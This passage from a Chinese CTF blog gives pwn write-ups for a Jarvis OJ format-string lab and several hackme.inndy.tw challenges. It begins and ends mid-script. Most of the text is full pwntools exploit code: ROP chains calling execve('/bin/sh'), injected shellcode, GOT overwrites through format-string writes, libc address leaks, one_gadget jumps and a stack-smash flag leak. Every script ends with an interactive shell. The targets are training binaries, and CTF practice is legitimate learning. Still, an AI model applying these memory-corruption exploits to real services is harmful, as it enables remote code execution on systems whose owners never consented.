process('./craxme')elf = ELF('./craxme')#将put_got修改为read(0,&amp;buf,0x100)#将printf修改为systemputs_got = elf.got['puts']printf_got = elf.got['printf']system_plt = elf.plt['system']#read(0,&amp;buf,0x100)read = 0x80485A1payload = fmtstr_payload(7,&#123;puts_got:read,printf_got:system_plt&#125;)p.sendline(payload)p.sendline('/bin/sh\x00') #这一句可加可不加我也不清楚 为什么 p.interactive() lab9格式化字符串漏洞，不过是有点蛇皮的格式化字符串，学到了不少新姿势 很明显的格式化字符串，但同时也可以发现，我们的输入是写到bss段去的，那就有一个问题了，我们要怎么利用格式化字符串修改got表为system函数的地址，因为这里我们要解决怎么把某个函数的got值放到栈里面去先看一下栈中的情况 可以发现输入放在bss段且固定在esp，但是也发现了几个有用的地址ebp1,fmt7,ebp2,fmt11，他们的格式化字符的偏移分别为6，7，10，11，我们还发现了libc_start_main+247这个真实地址，先泄漏出这个真实地址就可以得到偏移，进而算出其它函数的地址1234506:0018│ ebp 0xffffcd48 —▸ 0xffffcd58 —▸ 0xffffcd68 ◂— 0x007:001c│ 0xffffcd4c —▸ 0x8048584 (play+59) ◂— nop 、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、0a:0028│ 0xffffcd58 —▸ 0xffffcd68 ◂— 0x00b:002c│ 0xffffcd5c —▸ 0x80485b1 (main+42) ◂— nop 我们可以看到ebp1是指向ebp2的指针，ebp2指向一个不知名的地址，这样我们就可以得到栈的地址，因此，如果我们使用%n对ebp1进行操作，那么实际上会修改ebp2的内容，所以，如果我们将ebp2修改为指向fmt7，那么就可以对ebp2进行%n操作来修改fmt7的内容，试想，把fmt7的内容修改为printf_got，这样就实现了把got值放到栈里面去了，接下来就可能通过偏移来进行修改，但是又有另一个问题，一次只能修改2个字节，而需要修改的有4 个字节，又因为我们本来就是利用 printf 函数实现修改的，所以只能一次性修改4个字节（如果修改的不是printf函数，因为有个while循环，可以回到再利用printf函数进行第二次修改）。所以我们可以把要修改的高2 个字节放到fmt11去，同时修改两个位置，这样就可以了，那么思路就出来了。1234561、先泄漏出libc_start_main的地址，算出偏移2、利用偏移得到system等函数的地址3、泄漏出栈地址4、利用ebp1指向ebp2的关系修改ebp2指向fmt7，进而修改fmt7为printf_got，修改ebp2指向fmt11，进而修改fmt11为printf_got+25、修改fmt7和fmt11内容为system的地址6、发送&apos;/bin/sh&apos;做为system 的参数执行那可 exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#-*-coding:utf-8-*-#libc_start_main+247在偏移15处from pwn import *context.log_level = 'debug'p = process('./playfmt')# /lib/i386-linux-gnu/libc-2.23.soelf = ELF('./playfmt')libc = elf.libc p.recv()#泄漏 libc_start_main 的地址 p.sendline('%15$p')libc_start_main = int(p.recv(),16)-247print 'libc_start_main--&gt;' + hex(libc_start_main)# libc_start_main 的libc地址 libc_start_main_libc = libc.symbols['__libc_start_main']print 'libc_start_main_libc--&gt;' + hex(libc_start_main_libc)offset = libc_start_main - libc_start_main_libcprint 'offset--&gt;' + hex(offset)system_addr = offset + libc.symbols['system']print 'system_addr--&gt;' + hex(system_addr)printf_addr = offset + libc.symbols['printf']print 'printf_addr--&gt;' + hex(printf_addr) printf_got = elf.got['printf']print 'printf_got--&gt;' + hex(printf_got)# one_gadget = 0x3ac5c + offset# print 'one_gadget--&gt;' + hex(one_gadget)# 修改 printf_got 为 system_addr# 泄漏 ebp p.sendline('%6$p')ebp2 = int(p.recv(),16) #10ebp1 = ebp2-0x10 #6fmt7 = ebp1+0x4fmt11 = ebp2+0x4print 'ebp1--&gt;' + hex(ebp1)print 'ebp2--&gt;' + hex(ebp2)print 'fmt7--&gt;' + hex(fmt7)print 'fmt11--&gt;' + hex(fmt11)pause()# 先将 ebp2 指向fmt7# gdb.attach(p,"b *0x0804853B")p.sendline('%'+str(fmt7&amp;0xffff)+'c%6$hn')p.recv()# 再将 fmt7 修改为print_gotp.sendline('%'+str(printf_got&amp;0xffff)+'c%10$hn')p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: break# 现在要将 fmt11 修改为print_got+2# 先将 ebp2 指向fmt11p.sendline('%'+str(fmt11&amp;0xffff)+'c%6$hn')p.recv()#再将 fmt11 修改为printf_got+2(即printf_got的高4位现在在printf_got+2的低4位的位置)p.sendline('%'+str((printf_got+2)&amp;0xffff)+'c%10$hn')p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: break'''这个循环用于保证所有的字节都被输出，因为recv（）一次最多只能接收0x1000个字节，所以要进行多次recv（）才能保证全部字节都输出以便进行下面的操作需要注意的是，要构造一个字符串“n0va”来作标志，返回的大量字符串中如果包含了这个字符串那么说明之前构造的%n写入已经完成'''# --------到这里fmt7放着printf_got(即printf_addr),fmt11放着printf_got+2(即printf_addr的高4位移到了低4位的位置)# 修改printf_got 为sytem_addr (要同时修改fmt7为print_addr的低4位，fmt11为printf_addr的高4位)# 修改printf_got 的低4位payload = '%'+str((system_addr&amp;0xffff)-12)+'c%7$hn' #在调试时发现，在'%...c'之前有3个'n0va'所以要-12才能保证正确定入# 修改printf_got 的高4位payload += '%'+str((system_addr&gt;&gt;16)-(system_addr&amp;0xffff))+'c%11$hn'gdb.attach(p,"b *0x0804853B")p.sendline(payload)p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: breakp.sendline('/bin/sh')p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hackme.inndy之pwn]]></title>
    <url>%2F2019%2F03%2F28%2Fhackme.inndy%E4%B9%8Bpwn%2F</url>
    <content type="text"><![CDATA[catflagnc 连接直接get shell homeosrk数组下标溢出，绕过canary保护直接修改ret地址为后门函数call_me_mabe 这里可以算出arr[14]为ret位置 exp: 1234567891011121314151617from pwn import *# p = process('./homework')p = remote('hackme.inndy.tw',7701)call_me = 0x80485FBprint str(call_me)pause()p.recvuntil('What\'s your name? ')p.sendline('n0va')p.recvuntil('4 &gt; dump all numbers\n')p.recvuntil(' &gt; ')p.sendline('1')p.recvuntil('Index to edit: ')p.sendline('14')p.recvuntil('How many? ')p.sendline(str(call_me))p.sendline('0')p.interactive() ROP栈溢出，而且是gets的栈溢出，溢出空间无限，可以随便写，这道题有很多种写法，这里选择system call execve的系统调用号为0xb,eax,放着系统调用号，ebx,ecx,edx分别放着execve的三个参数，先找一波gadget 123450x0806c943 : int 0x800x080b8016 : pop eax ; ret0x080481c9 : pop ebx ; ret0x080de769 : pop ecx ; ret0x0806ecda : pop edx ; ret 于是就可以构造ROP链进入系统 调用了 exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *p = process('./rop')p = remote("hackme.inndy.tw","7704")elf = ELF('./rop')bss_addr = elf.bss()pop_in_ecx = 0x0804b5bapop_eax = 0x080b8016pop_ebx = 0x080481c9pop_ecx = 0x080de769pop_edx = 0x0806ecdaint_0x80 = 0x0806c943payload = 16*'a'payload += p32(pop_ecx) + p32(bss_addr)#分两次将'/bin/sh'写入bss段payload += p32(pop_in_ecx) + '/bin'payload += p32(pop_ecx) + p32(bss_addr+4)payload += p32(pop_in_ecx) + '/sh\x00'payload += p32(pop_eax) + p32(0xb)#bss_addr放着'/bin/sh'做为execve的第一个参数payload += p32(pop_ebx) + p32(bss_addr)payload += p32(pop_ecx) + p32(0)payload += p32(pop_edx) + p32(0)payload += p32(int_0x80)p.sendline(payload)p.interactive() ROP2syscall()是系统调用函数，第一个参数是系统调用号，后面的函数分别为调用函数的参数，查表可知4为write函数的系统调用号，3为read函数的系统调用号，所以 123syscall(4, 1, v4, 42); == write(1,v4,42)syscall(3, 0, &amp;v1, 1024); == read(0,&amp;v1,1024)return syscall(4, 1, &amp;v1, 1024); == return write(1,&amp;v1,1024) read 这里就存在一个很明显的栈溢出了，我们可以控制程序回到syscall的位置，只要将他的4个参数分别设为(b,&#39;/bin/sh&#39;,0,0)就行了 exp: 1234567891011121314151617181920#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./rop2')p = remote("hackme.inndy.tw","7703")elf = ELF('./rop2')bss_addr = elf.bss()syscall = 0x8048320overflow = 0x8048454#先调用read往bss段写入'/bin/sh'payload = 16*'a'payload += p32(syscall) + p32(overflow)payload += p32(3) + p32(0) + p32(bss_addr) + p32(8)p.sendline(payload)p.send('/bin/sh\x00')#调用execve函数get shellpayload = 16*'a'payload += p32(syscall) + p32(0) + p32(0xb) + p32(bss_addr) + p32(0) + p32(0)p.sendline(payload)p.interactive() toooomuch可以看到有一个gets，而且还有一个print_flag函数直接打印flag，溢出跳转就完事了 exp: 123456789from pwn import *# context.log_level = 'debug'# p = process('./toooomuch')p = remote("hackme.inndy.tw","7702")print_flag = 0x804863Bpayload = 28*'a'payload += p32(print_flag)p.sendline(payload)p.interactive() toooomuch-2程序 跟toooomuch一模一样，但是这次要求get shell ，那就不能直接跳到print_flag函数上去了 因为什么保护都没开，所以可以直接ret2shellcode，思路是这样的，先跳到gets函数往bss段写入shellcode，再跳到bss执行shellcode exp: 123456789101112131415from pwn import *context.log_level = 'debug'# p = process('./toooomuch-2')p = remote("hackme.inndy.tw","7702")elf = ELF('./toooomuch-2')bss_addr = elf.bss()gets_addr = elf.plt['gets']shellcode = asm(shellcraft.sh())payload = 28*'a'#----------(覆盖返回地址) ---（gets的返回地址）--（gets的参数）payload += p32(gets_addr) + p32(bss_addr) + p32(bss_addr)p.recvuntil('Give me your passcode: ')p.sendline(payload)p.sendline(shellcode)p.interactive() echo这是一道格式化字符串，直接修改printf_got为system_plt的值就行了，都是已知值，手动修改（当然也可以用工具 : fmtstr_payload(7,{printf_got:system_plt})） exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-# 偏移为7from pwn import *# p = process('./echo')p = remote("hackme.inndy.tw","7711")elf = ELF('./echo')printf_got = elf.got['printf']system_plt = elf.plt['system']print "printf_got--&gt;" + hex(printf_got)print "system_plt--&gt;" + hex(system_plt) #0x8048400pause()payload = p32(printf_got) + p32(printf_got+1) + p32(printf_got+2) + p32(printf_got+3)'''\x00\x84\x04\x08'''payload += '%240c' + '%7$hhn' #0x100-16payload += '%132c' + '%8$hhn' #0x184-0x100payload += '%128c' + '%9$hhn' #0x204-0x184payload += '%4c' + '%10$hhn' #0x208-0x204print payloadpause()p.sendline(payload)p.sendline('/bin/sh\x00')p.interactive() echo264位的格式化字符串漏洞，漏点跟echo一样，不过有一些坑需要注意一下 首先是保护开启了PIE，位置无关的可执行程序，即可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可以运行进程。但是低两位字节是固定的，所以可以通过这个泄露出程序的基地址。 64位程序函数地址存在&#39;\x00&#39;截断，所以要将函数地址放在最后（不能用fmtstr_payload这个工具，它只适用于32位） printf处下断查看栈可以看到main+74和libc_start_main+340这两个可以泄漏的地址，偏移分别为41和43，因为开启了PIE，而且后三位不变，所以可以泄漏出程序基地址就是0x555555554a03-0xa03，之后对一切地址的操作都加上这个基地址就是正确的地址了，以及libc_start_main的真实地址0x7ffff7a2d830-240就可以算出偏移，从而得到其它函数的真空地址，比如system，不过这道题我用的是one_gadget一把梭 得到了真实地址和偏移就可以进行写入操作了，修改exit_got表为one_gadget_addr exp: 1234567891011121314151617181920212223242526272829303132333435363738#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'p = remote("hackme.inndy.tw","7712")# p = process('./echo2')elf = ELF('./echo2')libc = ELF("./libc-2.23.so.x86_64") #hackme网站下载# libc = elf.libc #本地libc#泄漏 main 地址 p.sendline('%41$p')elf_base = int(p.recv(),16)-0xa03print "elf_base--&gt;" + hex(elf_base)#泄漏 libc_start_main 地址 p.sendline('%43$p')libc_start_main = int(p.recv(),16)-240libc_base = libc_start_main - libc.symbols['__libc_start_main']print "libc_start_main--&gt;" + hex(libc_start_main)# one_gadget = 0xf02a4 + libc_base #本地one_gadgetone_gadget = 0xf0897+libc_base #远程one_gadgetprint "one_gadget--&gt;" + hex(one_gadget)exit_got = elf.got['exit'] + elf_baseprint "exit_got--&gt;" + hex(exit_got)hex_one_gadget = hex(one_gadget)payload1 = 4*'a'+'%'+str(int(hex_one_gadget[-4:],16)-4)+'c%8$hn'+p64(exit_got)# payload1 = '%'+str(int(hex_one_gadget[-4:],16))+'c%10$hn'+p64(exit_got)payload2 = 4*'a'+'%'+str(int(hex_one_gadget[-8:-4],16)-4)+'c%8$hn'+p64(exit_got+2)payload3 = 4*'a'+'%'+str(int(hex_one_gadget[-12:-8],16)-4)+'c%8$hn'+p64(exit_got+4)#下断# point = 0x984+elf_base# point = str(hex(point))# gdb.attach(p,"b *"+point)p.sendline(payload1)sleep(1)p.sendline(payload2)sleep(1)p.sendline(payload3)sleep(1)p.interactive() 这里解释一下4*’a&#39;：是为了最后的p64(exit_got)对齐，gdb下断看一个栈的分布就清楚了 ehco3还是格式化字符串，不过我们的输入不再是在栈中了，是保存在bss段，这就不好操作了，我们需要在栈中找到指向栈的指针来进行操作向栈写入内容（建议先做一下jarvis OJ的lab 9然后再回头来看这题，因为题型差不多，但是lab 9没有下面的蛇皮操作） 不过这题最坑的还是在hardfmt函数前的这个玩意v3 = alloca(16 * (((buf &amp; 0x3039u) + 30) / 0x10));看了大佬的 writeup 这是一个抬栈操作，我们回到汇编去可以看到，在最后esp会减去eax使得整个栈帧往栈顶移了eax，而且eax是个随机数，好在还是有范围的。 测试一下我们可以发现大概的范围： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import randomfor x in xrange(1,50): buf= random.randint(0,0xffffffff) a=16 * (((buf &amp; 0x3039) + 30) / 0x10) print hex(a)----------------------------------------------------------------------------------------------0x400x100x10300x200x30200x300x30300x30100x30200x10100x10100x20200x20200x200x30200x300x300x20400x30500x30500x20300x400x30300x30300x400x20200x30400x10300x30500x10400x400x30300x20300x200x30200x10400x30100x30300x400x20500x500x10200x30200x30300x400x30200x30400x30400x3020 可能的数值有0x10,0x20,0x30,0x40,0x1030,........等等等等，也就是说一个值对应一个栈帧，所以我们只需要确定eax的值就可以确定栈的分布了，在.text:08048774 sub esp, eax下断gdb调试一下： 这一次eax 的值 为0x2050,我把它设为0x20，进去，在printf 下个断点，c一下，就可以看到正确的栈帧了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Breakpoint *0x08048646pwndbg&gt; stack 5000:0000│ esp 0xffffcd00 —▸ 0x804a080 (buff) ◂— &apos;AAAAAAAA\n&apos;... ↓02:0008│ 0xffffcd08 ◂— 0x100003:000c│ 0xffffcd0c ◂— 0x104:0010│ 0xffffcd10 ◂— 0xbd5d204605:0014│ 0xffffcd14 —▸ 0x804829c ◂— add byte ptr [ecx + ebp*2 + 0x62], ch06:0018│ 0xffffcd18 —▸ 0xf7ffd918 ◂— 0x007:001c│ 0xffffcd1c ◂— 0x008:0020│ 0xffffcd20 —▸ 0xffffcd5e ◂— 0x3080409:0024│ 0xffffcd24 —▸ 0xf7e0b018 ◂— stosd dword ptr es:[edi], eax0a:0028│ 0xffffcd28 —▸ 0xf7e6021b (setbuffer+11) ◂— add ebx, 0x151de50b:002c│ 0xffffcd2c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e0c:0030│ 0xffffcd30 —▸ 0xf7fe77eb (_dl_fixup+11) ◂— add esi, 0x158150d:0034│ 0xffffcd34 ◂— 0x00e:0038│ 0xffffcd38 —▸ 0xffffcd10 ◂— 0xbd5d20460f:003c│ 0xffffcd3c ◂— 0xc7e69f0010:0040│ 0xffffcd40 —▸ 0xffffcda8 ◂— 0x011:0044│ 0xffffcd44 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x112:0048│ ebp 0xffffcd48 —▸ 0xffffcda8 ◂— 0x013:004c│ 0xffffcd4c —▸ 0x804877b (main+236) ◂— mov eax, 014:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d204616:0058│ 0xffffcd58 —▸ 0xf7ed62ac (__close_nocancel+18) ◂— mov ebx, edx17:005c│ 0xffffcd5c —▸ 0x804874a (main+187) ◂— add esp, 0x1018:0060│ 0xffffcd60 ◂— 0x319:0064│ 0xffffcd64 —▸ 0x804a060 (magic) ◂— 0xbd5d20461a:0068│ 0xffffcd68 ◂— 0x41b:006c│ 0xffffcd6c —▸ 0x80486a6 (main+23) ◂— add ebx, 0x195a1c:0070│ 0xffffcd70 ◂— 0x80001d:0074│ 0xffffcd74 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db01e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)20:0080│ 0xffffcd80 ◂— 0x1... ↓22:0088│ 0xffffcd88 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;23:008c│ 0xffffcd8c ◂— 0x324:0090│ 0xffffcd90 ◂— 0x25d832425:0094│ 0xffffcd94 ◂— 0xdddfa71b26:0098│ 0xffffcd98 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;27:009c│ 0xffffcd9c ◂— 0xc7e69f0028:00a0│ 0xffffcda0 —▸ 0xffffcdc0 ◂— 0x129:00a4│ 0xffffcda4 ◂— 0x0... ↓2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x102c:00b0│ 0xffffcdb0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓2e:00b8│ 0xffffcdb8 ◂— 0x02f:00bc│ 0xffffcdbc —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1030:00c0│ 0xffffcdc0 ◂— 0x131:00c4│ 0xffffcdc4 —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;) 这里就以0x20的栈帧进行分析了，可以发现几个有用的地址 123456714:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d2046...1e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)...2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x10 偏移分别 为20,21,30,31,43，(这里规定它们分别为fmt20,fmt21,ebp1,ebp2) 而且偏移43处放着的是libc_start_main+247的地址，它的偏移是不变的，所以就可以用来做爆破的标志，来找到我们要的栈帧（exa = 0x20的栈帧） 123456789while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close() 爆破完成之后就可以进行正常的操作了思路如下 ： 通过libc_start_main算出偏移，进而得到system的真实地址 %n操作 30，10偏移处使ebp1指向fmt20，ebp2指向fmt21 %n操作 ebp1使fmt20的内容修改为exit_got 操作 ebp2 使fmt21的内容修改为exit_got+2 %n操作 fmt20 修改exit_got 为system低4位，操作 fmt21 修改exit_got+2为system高4位 发送&#39;/bin/sh&#39;作为system函数的参数 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'elf = ELF('./echo3')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close()libc_start_main = int(data[:-1],16)-247ebp1 = int(p.recv()[:-1],16) #在偏移为 31 (ebp1的偏移为87)print 'libc_start_main--&gt;' + hex(libc_start_main)print 'ebp1--&gt;' + hex(ebp1)fmt20 = ebp1-0x10cfmt21 = ebp1-0x108offset = libc_start_main - libc.symbols['__libc_start_main']system_addr = offset + libc.symbols['system']print 'system_addr--&gt;' + hex(system_addr)print 'libc_system--&gt;' + hex(libc.symbols['system'])pause()# exit_got = elf.got['exit']# print 'exit_got--&gt;' + hex(exit_got)printf_got = elf.got['printf']print 'printf_got--&gt;' + hex(printf_got)#%n操作 30,31偏移处使ebp1指向 fmt20 ebp2指向 fmt21payload_1 = '%'+str(fmt20&amp;0xffff)+'c%30$hn'payload_1 += '%4c%31$hn'payload_1 += '1111'# gdb.attach(p,"b *0x08048646")# pause()p.sendline(payload_1)#%n操作 ebp1使fmt20内容修改为exit_got,操作 ebp2使fmt21内容修改为exit_got+2payload_2 = '%'+str(printf_got&amp;0xffff)+'c%85$hn'payload_2 += '%2c%87$hn'payload_2 += '2222'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('1111\n')p.sendline(payload_2)#%n操作 fmt20修改exit_got为system低4位 fmt21修改为exit_got+2为system高4位payload_3 = '%'+str((system_addr&gt;&gt;16)&amp;0xff)+'c%20$hhn'payload_3 += '%'+str((system_addr&amp;0xffff)-((system_addr&gt;&gt;16)&amp;0xff))+'c%21$hn' payload_3 += '3333'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('2222\n')p.sendline(payload_3)p.recv()p.recvuntil('3333\n')p.send('/bin/sh\x00')p.interactive() smash-the-stack这题是利用ssp报错的方法泄漏出flag，在ctf-wiki中有介绍：Stack smash 只要将argv[0]覆盖为存放flag的地址即可，在write处下断查看argvp[0]的偏移 1234567891011121314151617181920212223pwndbg&gt; stack 2000:0000│ esp 0xffffcd70 ◂— 0x101:0004│ 0xffffcd74 —▸ 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)02:0008│ 0xffffcd78 ◂— &apos;1111&apos;03:000c│ 0xffffcd7c ◂— 0x004:0010│ 0xffffcd80 ◂— 0x105:0014│ 0xffffcd84 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)06:0018│ ebx ecx 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)07:001c│ 0xffffcd8c ◂— 0xc7f80a3208:0020│ 0xffffcd90 —▸ 0xffffcdb0 ◂— 0x109:0024│ 0xffffcd94 ◂— 0x0... ↓0b:002c│ 0xffffcd9c —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x100c:0030│ 0xffffcda0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓0e:0038│ 0xffffcda8 ◂— 0x00f:003c│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1010:0040│ 0xffffcdb0 ◂— 0x111:0044│ 0xffffcdb4 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)12:0048│ 0xffffcdb8 —▸ 0xffffce4c —▸ 0xffffd084 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;13:004c│ 0xffffcdbc ◂— 0x0pwndbg&gt; distance 0xffffce44 0xffffcd880xffffce44-&gt;0xffffcd88 is -0xbc bytes (-0x2f words) exp: 123456789from pwn import *context.log_level = 'debug'# p = process('./smash')p = remote('hackme.inndy.tw',7717)flag_addr = 0x804A060p.recvuntil('the flag')p.sendline(47*'a'+p32(flag_addr))# p.sendline(48*p32(flag_addr))p.interactive() 还有另一种做法就是不用算偏移，直接塞一大把p32(flag_addr)进去，因为只要覆盖到argv[0]的位置就可以了，但是实践表明，如果这个数差偏移太多的话，也是不太行的。（比如上面的塞100个在本地还是可以的，但是远程的话63个以上就已经不正常了，我猜是覆盖到了___stack_chk_fail函数部分导致函数无法正常执行，也就不存在通过___stack_chk_fail函数打印出flag了） onepunch这道题还是挺有趣的，起初看反编译代码不是很理解 v6 跟v4的关系，但是在汇编中就很直观了，v6是地址，v4是写入的内容，也就是任意地址写 还有就是这个程序的text段居然是可写的，结合上面的任意地址写就意味着我们可以修改程序的逻辑实现各种操作，相当于打patch 再看一下main函数：这里对输入的v4进行判断，如果不等于255就跳到400773处，所以我们只需要在这里打patch使其跳到main函数就可以实现无限输入。 1234567.text:0000000000400756 mov rax, [rbp+v6].text:000000000040075A mov edx, [rbp+v4].text:000000000040075D mov [rax], dl.text:000000000040075F ; 14: if ( v4 == 255 ).text:000000000040075F mov eax, [rbp+v4].text:0000000000400762 cmp eax, 0FFh.text:0000000000400767 jnz short loc_400773 这里就需要修改16进制了，IDA-&gt;options 将Number of opcode bytes(non-graph)的值设为16就可以看到汇编对应的16进制数。接下来算偏移，要从0x400769跳跟0x4006f1偏移应该为0x88 = 136，所以第一步就是将0x400768处的0xA修改为0x88 123456p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138') 接下来往text段写入shellcode，写完后再修改0x400768处为shellcode地址即可 完整exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *# p = process('./onepunch')p = remote("hackme.inndy.tw","7718")context.log_level = 'debug'p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138')shell_addr = 0x400790# shellcode = asm(shellcraft.sh())shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" shell_len = len(shellcode)i = 0while i&lt;shell_len: p.recvuntil('Where What?') p.sendline(str(hex(shell_addr+i))) # sleep(0.1) p.sendline(str(ord(shellcode[i]))) i += 1p.recvuntil('Where What?')p.sendline('0x400768')# sleep(0.1)p.sendline('39')p.interactive() tictactoe-1 每次可以写入一个字节，所以就很容易可以想到，把puts的got表修改成0x08048C46(cat flag的位置)，就可以拿到flag_simple了 exp: 123456789101112131415161718192021222324252627282930313233#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./tictactoe')p = remote("hackme.inndy.tw","7714")puts_got = 0x804B024# -50distance_addr = 0x8048C46p.recvuntil('Play (1)st or (2)nd? ')p.sendline('1')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x46')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-50')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x8c')p.recvuntil('Input move (9 to change flavor): ')# gdb.attach(p,"b *0x08048A71")# pause()p.sendline('-49')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x04')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-48')p.interactive() rsbo-2 栈溢出漏洞，程序中又有write函数，所以其实很清晰了，利用write函数泄漏出read的真实地址进而得到system的真实地址再跳转到去就可以get shell 了，但是这里有一个坑需要说一下，就是垃圾字符要用\x00去填充而不是用’a’啊啥的这些 因为len(buf)在栈中的位置跟buf的重叠的，所以当我们有字母去填充时，会导致 v8的值出错，这样程序就会崩溃退出 用\x00填的时候才会正常，接下来的操作不用多说了 exp: 12345678910111213141516171819202122232425262728293031323334353637#-*-coding:utf-8-*-# get shell 脚本from pwn import *# p = process('./rsbo')p = remote("hackme.inndy.tw","7706")elf = ELF('./rsbo')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')context.log_level = 'debug'main = 0x804867Fread_plt = elf.plt['read']read_got = elf.got['read']open_plt = elf.plt['open']write_plt = elf.plt['write']bss = elf.bss()# write(1,read_got,4)payload_2 = p32(0)*27 + p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4)print hex(len(payload_2))# gdb.attach(p,"b *0x0804867d")# pause()p.send(payload_2)read_addr = u32(p.recv(4))print "read_addr --&gt; " + hex(read_addr)offset = read_addr - libc.symbols['read']system_addr = offset + libc.symbols['system']bin_libc = libc.search("/bin/sh").next()bin_addr = bin_libc + offsetprint "system_addr --&gt; " + hex(system_addr)print "bin_addr --&gt; " + hex(bin_addr)# pause()# 回到 mainpayload_3 = p32(0)*25 + p32(system_addr) + p32(0) + p32(bin_addr)# gdb.attach(p,"b *0x0804867d")# pause()p.send(payload_3)p.interactive() rsbo1其实我是用的rsbo2的脚本直接拿到两题的flag再回过头来用open的方法做rsbo1，因为我一直在纳闷open返回的指针怎么获取给read用，但是后来问了师兄才知道了read的第一个参数的妙处： 关于read的第一个参数read(fd,buf,size) 为0时表示标准输入流（键盘)，为1时表示标准输出流（屏幕）(1一般是用在write吧)，为2时表示错误信息输出，为3之后表示文件流依次表示第一个open的文件第二个，第三个…….（如果同时打开多个文件的话） 所以open(“/home/ctf/flag”)后可以直接调用read(3,bss,0x60)再write就可以把flag打印出来的 还有个坑，在open这里虽然它只需要一个参数，但是它并不只有一个参数，我们要保证它的其实参数为0才能正常调用 exp: 1234567891011121314151617181920212223242526272829303132333435#-*-coding:utf-8from pwn import *context.log_level = 'debug'p = process('./rsbo')# p = remote("hackme.inndy.tw","7706")elf = ELF('./rsbo')open_plt = elf.plt['open']read_plt = elf.plt['read']write_plt = elf.plt['write']main = 0x804867Fstart = 0x08048490flag_addr = 0x80487D0bss = elf.bss()# fd = 